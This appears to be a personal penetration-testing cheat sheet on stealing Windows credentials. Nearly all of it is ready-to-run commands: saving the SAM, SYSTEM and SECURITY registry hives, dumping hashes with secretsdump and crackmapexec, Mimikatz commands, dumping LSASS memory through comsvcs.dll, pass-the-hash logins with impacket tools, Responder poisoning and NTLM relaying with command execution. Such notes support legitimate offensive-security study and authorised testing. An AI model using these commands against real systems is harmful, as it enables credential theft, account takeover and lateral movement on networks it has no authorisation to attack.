*  Attacking SAM:
	* Copy SAM hives `hklm\sam, hklm\system, hklm\security` from host using cmd:
		* `reg.exe save hklm\sam C:\sam.save`
		* `reg.exe save hklm\system C:\system.save`
		* `reg.exe save hklm\security C:\security.save`
	* Dumping hashes using the copied hives: `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL`
	* Dumping LSA Secrets Remotely: `crackmapexec smb <ip> --local-auth -u <user> -p <passowrd> --lsa`
	* Dumping SAM Remotely: `crackmapexec smb <ip> --local-auth -u <user> -p <passowrd> --sam`
* Dumping NTLM hashes by attacking LSASS:
	- Mimikatz:
		- Can be used to steal NTLM hash from windows memory.
		- Mimikatz requires Administrator or higher privileges and SeDebugPrivilege (enables debugging for processes).
		- Use psexec to elevate to system account privileges built-in MimikatzÂ token elevation function. 
		- Example: start mimikatz on the target machine. privilege::debug, token::elevate, lsadump::sam, sekurlsa::logonpasswords commands will enable debugging for process, elevate to SYSTEM and dump lssas credentials.
		- Then crack the NTLM hash using Hashcat, JTR. Or use pass the hash attack.
		- [Mimikatz cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
	- Without Mimikatz:
		- Dumping memory using GUI: Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
		- Dumping memory without GUI:
			- Get PID for lsass:
				- CMD: `tasklist /svc`
				- Powershell: `Get-Process lsass`
			- Dump lsass using powershell: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> <dump file path> full`
		- Extract NTLM hashes using Pypykatz: `pypykatz lsa minidump <dump file>`
* Pass the hash for NTLM:
	* Since NTLM hashes are not salted they can be passed around to authenticate into services like SMB, RDP, WinRM.
	* With UAC disabled or administrator privileges, command execution is also possible.
	* Tools that support pass the hash:
		* smbclient
		* CrackMapExec
		* impacket library scripts such as psexec.py, wmiexec.py
		* winrm
		* xfreerdp
	* Examples:
		* smbclient \\\\\<ip\>\\<share\> -U \<user\> --pw-nt-hash \<NTLM hash\>
		* impacket-psexec -hashes \<LM part of hash\>:\<NT part of hash\> \<user\>@\<ip\>
		* impacket-wmiexec -hashes \<LM part of hash\>:\<NT part of hash\> \<user\>@\<ip\>
	* If the NTLM hash obtain only contains NT part of hash then use 00000000000000000000000000000000 as the LM part of hash 
* Stealing Net-NTLMv1/v2 hashes using LLMNR, NBT-NS, and MDNS poisoning:
	* Net-NTLMv1/v2 authentication protocols can be abused to obtains Net-NTLMv2 hashes and crack using hashcat or JTR.
	* Get the target to authenticate to a malicious server such as SMB using Net-NTLMv1/v2 protocol and get Net-NTLMv1/v2 hash.
	* responder tool can set up various malicious servers and dump Net-NTLMv1/v2 hashes.
	* usage: `sudo responder -I <interface>`
	* if the responder is running SMB, then have the victim machine access the malicious share using something like `dir \\<ip\>\<share>`. Upon connection credentials are dumped.
	* Another idea is to provide a UNC path to a web application in an RFI vulnerability (assuming its running windows).
* Relaying Net-NTLMv1/v2 hashes:
	* Theory: Get the target to authenticate to a malicious server such as SMB using Net-NTLMv1/v2 protocol and relay the hash to another service of your choice to authenticate.
	* Example use case: If SMB signing is not enabled it could mean that NTLM relay attacks might work since the integrity of smb request is modified by the man in middle conducting the relay.
	* impacket library's ntlmrelayx tool can be used for this attack.
	* With UAC disabled or administrator privileges, command execution is also possible.
	* Example: `impacket-ntlmrelayx -smb2support -t <target ip> -c "<a nice powershell command>"`.
	* Use something like `dir \\<rouge smb ip>\<share>` on the victim side.
* For pth or ptt attacks in active directory use techniques in [Lateral Movement in Active Directory](obsidian://open?vault=Penetration%20testing&file=Pentesting%20notes%2FActive%20Directory%2FLateral%20Movement%20in%20Active%20Directory)